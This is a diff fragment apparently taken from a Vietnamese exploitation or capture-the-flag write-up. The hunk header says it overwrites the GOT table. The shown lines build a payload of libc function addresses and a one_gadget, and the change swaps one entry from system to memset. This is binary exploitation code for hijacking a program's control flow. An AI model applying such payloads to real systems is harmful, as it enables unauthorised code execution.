@@ -87,7 +87,7 @@ Ghi đè vào bảng GOT (các hàm nào không cần ghi đè thì để nguyê
     
     payload=p64(libc.sym['system'])
     payload+=p64(libc.sym['printf'])
-    payload+=p64(libc.sym['system'])
+    payload+=p64(libc.sym['memset'])
     payload+=p64(libc.sym['read'])
     payload+=p64(libc.sym['perror'])
     payload+=p64(one_gadget)
